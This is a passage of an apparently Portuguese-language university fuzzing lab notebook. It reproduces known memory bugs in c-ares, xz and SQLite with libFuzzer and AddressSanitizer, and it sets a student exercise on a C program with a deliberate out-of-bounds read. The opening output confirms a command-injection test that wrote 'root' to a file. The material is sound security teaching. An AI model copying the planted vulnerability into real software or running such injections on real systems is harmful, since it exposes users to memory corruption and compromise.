meshes(item=0)
animations(items=0)
bufferViews(items=0)
buffers(items=1)
  name         : 
    byteLength   : 16
  -------------------------------------

materials(items=0)
nodes(items=0)
images(items=0)
textures(items=0)
samplers(items=0)
cameras(items=0)
skins(items=0)
extensions(items=0)
[!] Conteudo gravado pelo comando injetado em /tmp/usp_lab/pwned.txt:
root
Linux 6.6.122+


---
## 5. c-ares
- **Vulnerabilidade**: `CVE-2016-5180` (1-Byte Heap Buffer Overflow)
- **Repositorio / Tag**: `c-ares/c-ares` (`cares-1_11_0`)
- **Target**: `google/fuzzer-test-suite/c-ares-CVE-2016-5180/target.cc`
- **Bug**: `ares_create_query.c:96-196` (`ares_create_query`). O calculo de `len` desconsidera que um `\` antes do ponto final (`\.`) escapa o separador de dominio, alocando 1 byte a menos no `malloc(len)` e causando `heap-buffer-overflow` na escrita de `*q = 0`.
- **Seed / Corpus**: **Nenhuma seed e nenhum dicionario!** Aqui o `libFuzzer` parte do zero absoluto (buffer vazio `""`) e, guiado apenas pelas catracas de cobertura (`SanitizerCoverage`), descobre sozinho a combinacao de barra invertida em ~300 execucoes (`< 0.5s`).

In [ ]:
#@title Target (target.cc) {display-mode: "form"}
%%writefile /tmp/usp_lab/5_cares_official_target.cc
// Copyright 2016 Google Inc. All Rights Reserved.
// Distributed under the Apache License, Version 2.0.
#include <stdint.h>
#include <stdlib.h>
#include <string>
#include <arpa/nameser.h>
#include <ares.h>

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
  unsigned char *buf;
  int buflen;
  std::string s(reinterpret_cast<const char *>(Data), Size);
  ares_create_query(s.c_str(), ns_c_in, ns_t_a, 0x1234, 0, &buf, &buflen, 0);
  free(buf);
  return 0;
}


Writing /tmp/usp_lab/5_cares_official_target.cc


In [ ]:
%%bash
# Exibe as linhas 185-202 de ares_create_query.c
nl -ba /tmp/usp_lab/repos/c-ares/ares_create_query.c | sed -n '185,202p'

# Compila o target oficial contra libcares.a com libFuzzer + AddressSanitizer
clang++ -g -O1 -fsanitize=fuzzer,address \
  -I/tmp/usp_lab/repos/c-ares \
  /tmp/usp_lab/5_cares_official_target.cc \
  /tmp/usp_lab/repos/cares_create_query.o \
  /tmp/usp_lab/repos/c-ares/.libs/libcares.a \
  -o /tmp/usp_lab/bin/5_cares_official_fuzzer

# Executa o fuzzer SEM nenhuma pasta de seeds (parte de uma entrada vazia)
/tmp/usp_lab/bin/5_cares_official_fuzzer -max_len=64 -artifact_prefix=/tmp/usp_lab/ || true


   185	      /* Go to the next label and repeat, unless we hit the end. */
   186	      if (!*p)
   187	        break;
   188	      name = p + 1;
   189	    }
   190	
   191	  /* Add the zero-length label at the end. */
   192	  *q++ = 0;
   193	
   194	  /* Finish off the question with the type and class. */
   195	  DNS_QUESTION_SET_TYPE(q, type);
   196	  DNS_QUESTION_SET_CLASS(q, dnsclass);
   197	
   198	  if (max_udp_size)
   199	  {
   200	      q += QFIXEDSZ;
   201	      memset(q, 0, EDNSFIXEDSZ);
   202	      q++;


INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 170727784
INFO: Loaded 1 modules   (70 inline 8-bit counters): 70 [0x5c5dc1f7cf00, 0x5c5dc1f7cf46), 
INFO: Loaded 1 PC tables (70 PCs): 70 [0x5c5dc1f7cf48,0x5c5dc1f7d3a8), 
INFO: A corpus is not provided, starting from an empty corpus
#2	INITED cov: 21 ft: 22 corp: 1/1b exec/s: 0 rss: 32Mb
#4	NEW    cov: 23 ft: 29 corp: 2/3b lim: 4 exec/s: 0 rss: 32Mb L: 2/2 MS: 2 ChangeByte-CrossOver-
#8	NEW    cov: 23 ft: 35 corp: 3/6b lim: 4 exec/s: 0 rss: 32Mb L: 3/3 MS: 4 ChangeByte-ShuffleBytes-InsertByte-CrossOver-
#15	NEW    cov: 24 ft: 36 corp: 4/8b lim: 4 exec/s: 0 rss: 32Mb L: 2/3 MS: 2 ShuffleBytes-ChangeBinInt-
#17	NEW    cov: 24 ft: 42 corp: 5/12b lim: 4 exec/s: 0 rss: 32Mb L: 4/4 MS: 2 ChangeByte-InsertByte-
#30	NEW    cov: 27 ft: 45 corp: 6/15b lim: 4 exec/s: 0 rss: 32Mb L: 3/4 MS: 3 ChangeBinInt-InsertByte-ChangeBit-
#131	NEW    cov: 29 ft: 47 corp: 7/16b lim: 4 exec/s: 0 rss: 32Mb L: 1/4 MS: 1 EraseBytes-
#176	NEW    

---
## 6. XZ Utils
- **Vulnerabilidade**: `CVE-2024-3094` (`IFUNC` vs ASan Shadow Memory `0x7fff8000`)
- **Repositorio / Tag**: `tukaani-project/xz` (`v5.6.0`)
- **Target**: `xz/tests/ossfuzz/fuzz_encode_stream.c`
- **Bug**: `src/liblzma/check/crc64_fast.c` (`__attribute__((__ifunc__("crc64_resolve")))`). O dynamic linker (`ld-linux.so`) resolve simbolos `IFUNC` antes de `__asan_init()` mapear a *Shadow Memory* (`0x7fff8000`), gerando `SIGSEGV` na inicializacao. Para contornar a falha, o Pull Request `#10667` no OSS-Fuzz compilou a biblioteca com `-DCRC_GENERIC`, desativando o `IFUNC` onde o backdoor `CVE-2024-3094` foi instalado.

In [ ]:
#@title Target (fuzz_encode_stream.c) {display-mode: "form"}
%%writefile /tmp/usp_lab/6_xz_official_target.c
#include <inttypes.h>
#include <stdlib.h>
#include <stdio.h>
#include "lzma.h"
#include "fuzz_common.h"

extern int LLVMFuzzerTestOneInput(const uint8_t *inbuf, size_t inbuf_size) {
  if (inbuf_size <= 1) return 0;
  const uint8_t header = inbuf[0];
  const uint32_t preset_level = header & 0x0F;
  if (preset_level > 6) return 0;
  lzma_options_lzma opt_lzma;
  if (lzma_lzma_preset(&opt_lzma, preset_level)) abort();
  lzma_filter filters[2];
  filters[0].id = LZMA_FILTER_LZMA2;
  filters[0].options = &opt_lzma;
  filters[1].id = LZMA_VLI_UNKNOWN;

  lzma_stream strm = LZMA_STREAM_INIT;
  if (lzma_stream_encoder(&strm, filters, LZMA_CHECK_CRC64) != LZMA_OK) abort();
  fuzz_code(&strm, inbuf + 1, inbuf_size - 1);
  lzma_end(&strm);
  return 0;
}


Writing /tmp/usp_lab/6_xz_official_target.c


In [ ]:
%%bash
nl -ba /tmp/usp_lab/repos/xz/src/liblzma/check/crc64_fast.c | sed -n '90,115p'

# [A] Build default (IFUNC ativo, sem -DCRC_GENERIC): falha com SIGSEGV em 0x7fff8000 antes do main()
clang -g -O1 -fsanitize=fuzzer,address \
  -I/tmp/usp_lab/repos/xz/src/liblzma/api -I/tmp/usp_lab/repos/xz/tests/ossfuzz \
  /tmp/usp_lab/6_xz_official_target.c \
  /tmp/usp_lab/repos/xz/src/liblzma/.libs/liblzma.a \
  -o /tmp/usp_lab/bin/6_xz_official_ifunc_bug

set +e
gdb -batch -ex "run -runs=1" -ex "x/i \$pc" -ex "bt 4" /tmp/usp_lab/bin/6_xz_official_ifunc_bug 2>&1 | grep -E "Program received|0x7fff8000|=>|#0|#1|#2|#3" || true
/tmp/usp_lab/bin/6_xz_official_ifunc_bug -runs=1
echo "-> Processo terminou com SIGSEGV (exit code: $?) em 0x7fff8000 (ASan Shadow Memory ainda nao mapeada)."
set -e

# [B] Build com -DCRC_GENERIC (workaround do PR #10667 no OSS-Fuzz que desativa o IFUNC)
clang -g -O1 -fsanitize=fuzzer-no-link,address -DCRC_GENERIC -DSIZEOF_SIZE_T=8 -DHAVE__BOOL=1 -DHAVE_STDINT_H=1 -DHAVE_INTTYPES_H=1 -DHAVE_LIMITS_H=1 -DTUKLIB_FAST_UNALIGNED_ACCESS=1 \
  -I/tmp/usp_lab/repos/xz -I/tmp/usp_lab/repos/xz/src/liblzma/api -I/tmp/usp_lab/repos/xz/src/liblzma/common \
  -I/tmp/usp_lab/repos/xz/src/liblzma/check -I/tmp/usp_lab/repos/xz/src/common \
  -c /tmp/usp_lab/repos/xz/src/liblzma/check/crc64_fast.c -o /tmp/usp_lab/repos/xz_crc64_generic.o
clang -g -O1 -fsanitize=fuzzer-no-link,address -DCRC_GENERIC -DSIZEOF_SIZE_T=8 -DHAVE__BOOL=1 -DHAVE_STDINT_H=1 -DHAVE_INTTYPES_H=1 -DHAVE_LIMITS_H=1 -DTUKLIB_FAST_UNALIGNED_ACCESS=1 \
  -I/tmp/usp_lab/repos/xz -I/tmp/usp_lab/repos/xz/src/liblzma/api -I/tmp/usp_lab/repos/xz/src/liblzma/common \
  -I/tmp/usp_lab/repos/xz/src/liblzma/check -I/tmp/usp_lab/repos/xz/src/common \
  -c /tmp/usp_lab/repos/xz/src/liblzma/check/crc32_fast.c -o /tmp/usp_lab/repos/xz_crc32_generic.o

clang -g -O1 -fsanitize=fuzzer,address \
  -I/tmp/usp_lab/repos/xz/src/liblzma/api -I/tmp/usp_lab/repos/xz/tests/ossfuzz \
  /tmp/usp_lab/6_xz_official_target.c \
  /tmp/usp_lab/repos/xz_crc64_generic.o /tmp/usp_lab/repos/xz_crc32_generic.o \
  /tmp/usp_lab/repos/xz/src/liblzma/.libs/liblzma.a \
  -o /tmp/usp_lab/bin/6_xz_official_generic

/tmp/usp_lab/bin/6_xz_official_generic -runs=5
echo "-> Execucao concluida com CRC_GENERIC (exit code: 0)."


    90	// If both the generic and arch-optimized implementations are usable, then
    91	// the function that is used is selected at runtime. See crc32_fast.c.
    92	
    93	typedef uint64_t (*crc64_func_type)(
    94			const uint8_t *buf, size_t size, uint64_t crc);
    95	
    96	#if defined(CRC_USE_IFUNC) && defined(__clang__)
    97	#	pragma GCC diagnostic push
    98	#	pragma GCC diagnostic ignored "-Wunused-function"
    99	#endif
   100	
   101	static crc64_func_type
   102	crc64_resolve(void)
   103	{
   104		return is_arch_extension_supported()
   105				? &crc64_arch_optimized : &crc64_generic;
   106	}
   107	
   108	#if defined(CRC_USE_IFUNC) && defined(__clang__)
   109	#	pragma GCC diagnostic pop
   110	#endif
   111	
   112	#ifndef CRC_USE_IFUNC
   113	
   114	#ifdef HAVE_FUNC_ATTRIBUTE_CONSTRUCTOR
   115	#	define CRC64_SET_FUNC_ATTR __attribute__((__constructor__))
Program received signal SIGSEGV, Segmentation fault.
=> 0x5555556b4803 <__get_cpuid+99>:	movzbl 0x7fff800

bash: line 12: 41169 Segmentation fault      (core dumped) /tmp/usp_lab/bin/6_xz_official_ifunc_bug -runs=1
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 1859454991
INFO: Loaded 1 modules   (2300 inline 8-bit counters): 2300 [0x577bd3b80208, 0x577bd3b80b04), 
INFO: Loaded 1 PC tables (2300 PCs): 2300 [0x577bd3b80b08,0x577bd3b89ac8), 
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes
INFO: A corpus is not provided, starting from an empty corpus
#2	INITED cov: 2 ft: 2 corp: 1/1b exec/s: 0 rss: 32Mb
#3	NEW    cov: 3 ft: 3 corp: 2/3b lim: 4 exec/s: 0 rss: 32Mb L: 2/2 MS: 1 InsertByte-
#5	DONE   cov: 3 ft: 3 corp: 2/3b lim: 4 exec/s: 0 rss: 32Mb
Done 5 runs in 0 second(s)


---
## 7. SQLite
- **Vulnerabilidade**: Stack Buffer Underflow em `seriesBestIndex` (Big Sleep)
- **Repositorio / Commit**: `sqlite/sqlite` (`5804da02182927dafae24a83bfe4176bb1746118`)
- **Target**: `sqlite/test/ossfuzz.c`
- **Bug**: `ext/misc/series.c:705-718` (`seriesBestIndex`). A tabela virtual `generate_series` nao declarava `WITHOUT ROWID`. Consultas com restricao de igualdade sobre `rowid` (`iColumn = -1`) calculam `iCol = -1 - 1 = -2` e escrevem em `aIdx[-2]` na pilha (`stack-buffer-underflow`). O target `test/ossfuzz.c` nao inicializava `sqlite3_series_init(cx.db, 0, 0)` por padrao; basta registra-la na abertura do banco em memoria.
- **Seed / Corpus (`/tmp/usp_lab/seeds_sqlite`) & Dicionario (`sql.dict`)**: A pasta `seeds_sqlite` contem a consulta valida `SELECT * FROM generate_series(1,5) WHERE rowid>1;` (que usa o operador `>`, onde o bug nao ocorre) e o dicionario fornece tokens SQL (`"="`, `"rowid="`). Isso permite que o fuzzer comece com uma sintaxe SQL valida e, ao trocar `>` por `=`, atinja imediatamente o underflow na pilha.

In [ ]:
#@title Target (ossfuzz.c) {display-mode: "form"}
%%writefile /tmp/usp_lab/7_sqlite_official_ossfuzz.c
// SQLite fuzz target (sqlite/test/ossfuzz.c) with sqlite3_series_init registered
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "sqlite3.h"

extern int sqlite3_series_init(sqlite3*, char**, const void*);

typedef struct FuzzCtx {
  sqlite3 *db;
  unsigned execCnt;
  unsigned nCb;
} FuzzCtx;

static int progress_handler(void *pClientData) {
  FuzzCtx *p = (FuzzCtx*)pClientData;
  return (++p->nCb) > 50;
}

static int exec_handler(void *pClientData, int argc, char **argv, char **namev) {
  FuzzCtx *p = (FuzzCtx*)pClientData;
  int i;
  if (argv) {
    for (i = 0; i < argc; i++) sqlite3_free(sqlite3_mprintf("%s", argv[i]));
  }
  return (p->execCnt--) <= 0;
}

int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {
  char *zErrMsg = 0;
  uint8_t uSelector;
  int rc;
  char *zSql;
  FuzzCtx cx;

  memset(&cx, 0, sizeof(cx));
  if (size < 3) return 0;
  if (data[1] == '\n') {
    uSelector = data[0]; data += 2; size -= 2;
  } else {
    uSelector = 0xfd;
  }

  if (sqlite3_initialize()) return 0;
  rc = sqlite3_open_v2("fuzz.db", &cx.db,
           SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE | SQLITE_OPEN_MEMORY, 0);
  if (rc) return 0;

  sqlite3_series_init(cx.db, 0, 0);
  sqlite3_progress_handler(cx.db, 10, progress_handler, (void*)&cx);

  sqlite3_limit(cx.db, SQLITE_LIMIT_VDBE_OP, 25000);
  sqlite3_hard_heap_limit64(20000000);
  sqlite3_limit(cx.db, SQLITE_LIMIT_LENGTH, 50000);
  cx.execCnt = uSelector + 1;

  zSql = sqlite3_mprintf("%.*s", (int)size, data);
  sqlite3_exec(cx.db, zSql, exec_handler, (void*)&cx, &zErrMsg);

  sqlite3_free(zErrMsg);
  sqlite3_free(zSql);
  sqlite3_close(cx.db);
  return 0;
}


Writing /tmp/usp_lab/7_sqlite_official_ossfuzz.c


In [ ]:
%%bash
# Exibe as linhas 704-720 de ext/misc/series.c (seriesBestIndex)
nl -ba /tmp/usp_lab/repos/sqlite/ext/misc/series.c | sed -n '704,720p'

# Compila o target test/ossfuzz.c junto com a extensao series.c e sqlite3_core.o
clang -g -O1 -fsanitize=fuzzer,address \
  -I/tmp/usp_lab/repos/sqlite \
  /tmp/usp_lab/7_sqlite_official_ossfuzz.c \
  /tmp/usp_lab/repos/sqlite_series.o \
  /tmp/usp_lab/repos/sqlite3_core.o -lpthread -ldl -lm \
  -o /tmp/usp_lab/bin/7_sqlite_official_fuzzer

# Executa o fuzzer passando o dicionario SQL (-dict) e o Seed Corpus (/tmp/usp_lab/seeds_sqlite)
/tmp/usp_lab/bin/7_sqlite_official_fuzzer -dict=/tmp/usp_lab/sql.dict -artifact_prefix=/tmp/usp_lab/ /tmp/usp_lab/seeds_sqlite || true


   704	    }
   705	    iCol = pConstraint->iColumn - SERIES_COLUMN_START;
   706	    assert( iCol>=0 && iCol<=2 );
   707	    iMask = 1 << iCol;
   708	#ifndef ZERO_ARGUMENT_GENERATE_SERIES
   709	    if( iCol==0 && op==SQLITE_INDEX_CONSTRAINT_EQ ){
   710	      bStartSeen = 1;
   711	    }
   712	#endif
   713	    if( pConstraint->usable==0 ){
   714	      unusableMask |=  iMask;
   715	      continue;
   716	    }else if( op==SQLITE_INDEX_CONSTRAINT_EQ ){
   717	      idxNum |= iMask;
   718	      aIdx[iCol] = i;
   719	    }
   720	  }


Dictionary: 2 entries
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 2298021655
INFO: Loaded 1 modules   (151 inline 8-bit counters): 151 [0x5ce3edc68360, 0x5ce3edc683f7), 
INFO: Loaded 1 PC tables (151 PCs): 151 [0x5ce3edc683f8,0x5ce3edc68d68), 
INFO:        1 files found in /tmp/usp_lab/seeds_sqlite
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes
INFO: seed corpus: files: 1 min: 51b max: 51b total: 51b rss: 32Mb
#2	INITED cov: 51 ft: 52 corp: 1/51b exec/s: 0 rss: 34Mb
#3	NEW    cov: 51 ft: 53 corp: 2/102b lim: 51 exec/s: 0 rss: 34Mb L: 51/51 MS: 1 ChangeBinInt-
#14	NEW    cov: 51 ft: 56 corp: 3/153b lim: 51 exec/s: 0 rss: 35Mb L: 51/51 MS: 1 ShuffleBytes-
#16	REDUCE cov: 51 ft: 56 corp: 3/142b lim: 51 exec/s: 0 rss: 35Mb L: 40/51 MS: 2 ShuffleBytes-CrossOver-
#22	REDUCE cov: 51 ft: 56 corp: 3/137b lim: 51 exec/s: 0 rss: 36Mb L: 35/51 MS: 1 EraseBytes-
#38	NEW    cov: 52 ft: 62 corp: 4/188b lim: 51 exec/s: 0 rss: 37Mb L: 5

---
## 8. Desafio Pratico
- **Contexto**: O programa em C abaixo (`program.c`) aloca um buffer de **100 bytes** na Heap (`malloc(100)`), converte o primeiro argumento recebido pelo terminal (`argv[1]`) em um numero inteiro usando a funcao `atoi()`, e le a posicao `buf[index]` sem verificar os limites do array.
- **Como o Gerador Funciona**: A funcao `fuzzer(max_length, char_start, char_range)` em Python sorteia caracteres da tabela ASCII comecando no codigo `char_start` (obtido com `ord('caractere')`) e caminhando ate `char_start + char_range`.
- **Seu Desafio**: No codigo inicial, o loop chama `fuzzer(5, ord('a'), 26)`, que gera apenas letras minusculas. Como `atoi()` retorna `0` quando recebe letras, o programa acessa sempre `buf[0]` e nunca falha. Pense em qual tipo de caractere `atoi()` espera receber e ajuste os parametros de `fuzzer(...)` na linha marcada com `TODO` para que o seu fuzzer gere valores capazes de ultrapassar os 100 bytes do buffer e acionar o **AddressSanitizer**!

In [ ]:
#@title Alvo (program.c) {display-mode: "form"}
%%writefile /tmp/usp_lab/program.c
#include <stdlib.h> // Biblioteca padrao para malloc(), free() e atoi()
#include <string.h> // Biblioteca padrao para memset()

int main(int argc, char** argv) {
  // Se nenhum argumento for passado na linha de comando, encerra sem erro
  if (argc < 2) return 0;

  // Aloca um buffer de exatamente 100 bytes na memoria Heap (indices validos: 0 a 99)
  char *buf = (char *)malloc(100);

  // Preenche todos os 100 bytes do buffer com o valor 42
  memset(buf, 42, 100);

  // Converte o texto recebido no primeiro argumento (argv[1]) para um numero inteiro
  int index = atoi(argv[1]);

  // VULNERABILIDADE: le a posicao 'index' sem checar se index >= 100 ou index < 0!
  char val = buf[index];

  // Libera o buffer alocado na Heap antes de encerrar
  free(buf);
  return val;
}


Writing /tmp/usp_lab/program.c


In [ ]:
import random      # Modulo padrao do Python para sorteio de numeros pseudoaleatorios
import subprocess  # Modulo padrao do Python para compilar e executar o binario em C

# Compila o arquivo program.c ativando o AddressSanitizer (-fsanitize=address) para vigiar a Heap
subprocess.run(
    ['/tmp/usp_lab/bin/clang', '-g', '-O1', '-fsanitize=address', '/tmp/usp_lab/program.c', '-o', '/tmp/usp_lab/bin/program'],
    check=True
)

# Funcao geradora de entradas aleatorias (baseada no livro The Fuzzing Book)
def fuzzer(max_length: int = 100, char_start: int = 32, char_range: int = 32) -> str:
    # Sorteia o comprimento da string que sera gerada (entre 1 e max_length caracteres)
    string_length = random.randrange(1, max_length + 1)
    # Inicializa a string vazia que recebera os caracteres sorteados
    out = ""
    # Repete o sorteio para cada caractere da string
    for i in range(0, string_length):
        # Sorteia um codigo ASCII no intervalo [char_start, char_start + char_range) e converte para caractere com chr()
        out += chr(random.randrange(char_start, char_start + char_range))
    # Retorna a string final gerada pelo fuzzer
    return out

# Executa ate 50 tentativas enviando as entradas geradas pelo fuzzer para o binario /tmp/usp_lab/bin/program
for attempt in range(1, 50):
    # TODO: ajuste os argumentos de fuzzer(...) abaixo para que o atoi() receba valores capazes de estourar os 100 bytes do buffer!
    payload = fuzzer(5, ord('0'), 26)

    # Executa o programa em C passando o payload gerado como primeiro argumento (argv[1])
    result = subprocess.run(['/tmp/usp_lab/bin/program', payload], capture_output=True, text=True)

    # Verifica se o AddressSanitizer detectou corrupcao de memoria na saida de erro (stderr)
    if 'AddressSanitizer' in result.stderr:
        print(f"Crash encontrado na tentativa #{attempt} com a entrada: {payload!r}\n")
        print(result.stderr)
        break
else:
    print("Nenhum crash em 50 tentativas (o atoi() converteu as entradas para um indice dentro dos 100 bytes).")


Crash encontrado na tentativa #24 com a entrada: '180@5'

==41244==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50b0000000f4 at pc 0x56b0238ff7b8 bp 0x7ffda1fa8b20 sp 0x7ffda1fa8b18
READ of size 1 at 0x50b0000000f4 thread T0
    #0 0x56b0238ff7b7 in main /tmp/usp_lab/program.c:18:14
    #1 0x7f58046631c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #2 0x7f580466328a in __libc_start_main csu/../csu/libc-start.c:360:3
    #3 0x56b023826344 in _start (/tmp/usp_lab/bin/program+0x2b344) (BuildId: 76a95ed78f7a75f46ce439c5b91012d5af55f494)

0x50b0000000f4 is located 80 bytes after 100-byte region [0x50b000000040,0x50b0000000a4)
allocated by thread T0 here:
    #0 0x56b0238c1193 in malloc (/tmp/usp_lab/bin/program+0xc6193) (BuildId: 76a95ed78f7a75f46ce439c5b91012d5af55f494)
    #1 0x56b0238ff747 in main /tmp/usp_lab/program.c:9:23

SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/usp_lab/program.c:18:14 in main
Shadow bytes around the buggy a